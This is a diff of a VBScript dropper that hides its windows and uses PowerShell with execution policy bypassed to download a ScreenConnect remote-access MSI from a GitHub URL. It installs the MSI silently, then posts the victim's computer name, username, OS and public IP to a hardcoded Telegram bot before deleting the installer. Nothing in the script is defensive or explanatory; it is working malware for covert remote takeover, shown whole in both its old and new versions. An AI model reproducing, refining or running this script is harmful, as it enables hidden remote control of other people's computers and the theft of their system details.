@@ -1,52 +1,72 @@
-' --- Telegram Configuration ---
-Dim BOT_TOKEN, CHAT_ID, PACKAGE_URL, TEMP_PATH
+' ================== CONFIG ==================
+Dim BOT_TOKEN, CHAT_ID, PACKAGE_URL, TEMP_PATH, TEMP_DIR
 
-BOT_TOKEN = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
-CHAT_ID = "8345342738"
+BOT_TOKEN   = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
+CHAT_ID     = "8345342738"
 PACKAGE_URL = "https://github.com/Brayan-277/screen/raw/refs/heads/main/ConnectWiseControl.ClientSetup%20(2).msi"
-TEMP_PATH = "C:\Temp\sc.msi"
 
+TEMP_DIR  = "C:\Temp"
+TEMP_PATH = TEMP_DIR & "\sc.msi"
+
+' ================== OBJECTS ==================
+Dim objShell, objFSO, intReturn
 Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objFSO   = CreateObject("Scripting.FileSystemObject")
 
-' 1. Create Temp Directory
-If Not objFSO.FolderExists("C:\Temp") Then
-    objFSO.CreateFolder("C:\Temp")
+' ================== CREATE TEMP DIR ==================
+If Not objFSO.FolderExists(TEMP_DIR) Then
+    objFSO.CreateFolder TEMP_DIR
 End If
 
-' 1a. Cleanup any old sc.msi or patch.msi files
-Dim oldFiles, file
-oldFiles = Array("C:\Temp\sc.msi", "C:\Temp\patch.msi")
-For Each file In oldFiles
-    If objFSO.FileExists(file) Then
-        objFSO.DeleteFile(file)
+' ================== CLEAN OLD FILES ==================
+Dim oldFiles, f
+oldFiles = Array(TEMP_DIR & "\sc.msi", TEMP_DIR & "\patch.msi")
+
+For Each f In oldFiles
+    If objFSO.FileExists(f) Then
+        objFSO.DeleteFile f, True
     End If
 Next
 
-' 2. Download File
+' ================== DOWNLOAD MSI ==================
 Dim downloadCmd
-downloadCmd = "powershell -ExecutionPolicy Bypass -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('" & PACKAGE_URL & "', '" & TEMP_PATH & "')"""
-objShell.Run downloadCmd, 0, True
+downloadCmd = _
+    "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
+    """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
+    "(New-Object Net.WebClient).DownloadFile('" & PACKAGE_URL & "','" & TEMP_PATH & "')"""
 
-' 3. Install MSI silently
+intReturn = objShell.Run(downloadCmd, 0, True)
+
+If Not objFSO.FileExists(TEMP_PATH) Then
+    WScript.Quit 1
+End If
+
+' ================== INSTALL MSI ==================
 Dim installCmd
 installCmd = "msiexec.exe /i """ & TEMP_PATH & """ /qn /norestart"
+
 intReturn = objShell.Run(installCmd, 0, True)
 
-' 4. Send Telegram Notification
+' ================== TELEGRAM NOTIFICATION ==================
 Dim notifyCmd
-notifyCmd = "powershell -ExecutionPolicy Bypass -Command "" " & _
-            "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
-            "$ip = (Invoke-WebRequest -uri 'https://api.ipify.org' -UseBasicParsing).Content; " & _
-            "$os = (Get-WmiObject -Class Win32_OperatingSystem).Caption; " & _
-            "$dt = Get-Date -Format 'M/d/yyyy h:mm:ss tt'; " & _
-            "$msg = '=== SCREENCONNECT MONITOR STARTED ===' + [char]10 + [char]10 + 'Computer: ' + $env:COMPUTERNAME + [char]10 + 'User: ' + $env:USERNAME + [char]10 + 'OS: ' + $os + [char]10 + 'Time: ' + $dt + [char]10 + 'IP: ' + $ip; " & _
-            "$url = 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage'; " & _
-            "$body = @{ chat_id = '" & CHAT_ID & "'; text = $msg }; " & _
-            "Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing"""
-objShell.Run notifyCmd, 0, True
+notifyCmd = _
+    "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
+    """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
+    "$ip=(Invoke-RestMethod 'https://api.ipify.org');" & _
+    "$os=(Get-CimInstance Win32_OperatingSystem).Caption;" & _
+    "$dt=Get-Date -Format 'yyyy-MM-dd HH:mm:ss';" & _
+    "$msg='=== SCREENCONNECT INSTALLED ==='+[char]10+" & _
+         "'PC: '+$env:COMPUTERNAME+[char]10+" & _
+         "'User: '+$env:USERNAME+[char]10+" & _
+         "'OS: '+$os+[char]10+" & _
+         "'IP: '+$ip+[char]10+" & _
+         "'Time: '+$dt;" & _
+    "$body=@{chat_id='" & CHAT_ID & "';text=$msg};" & _
+    "Invoke-RestMethod -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -Body $body"""
 
-' 5. Cleanup the downloaded MSI
+objShell.Run notifyCmd, 0, False
+
+' ================== CLEANUP ==================
 If objFSO.FileExists(TEMP_PATH) Then
-    objFSO.DeleteFile(TEMP_PATH)
+    objFSO.DeleteFile TEMP_PATH, True
 End If
